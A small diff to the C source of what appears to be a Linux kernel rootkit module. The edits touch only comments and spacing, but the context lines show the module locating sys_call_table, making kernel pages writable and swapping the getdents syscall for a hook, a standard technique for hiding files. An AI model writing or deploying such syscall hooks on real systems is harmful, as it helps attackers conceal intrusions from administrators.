@@ -84,16 +84,15 @@ asmlinkage int	HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned
 }
 
 
-// Set up hooks.
 static int __init SetHooks(void) {
-	// Gets Syscall Table **
+	// Gets Syscall Table
  	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table");
 
 	printk(KERN_INFO "Hooks Will Be Set.\n");
 	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);
 
-  // Opens the memory pages to be written
-	EnablePageWriting();
+
+	EnablePageWriting();// Opens the memory pages to be written
 
   // Replaces Pointer Of Syscall_open on our syscall.
 	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
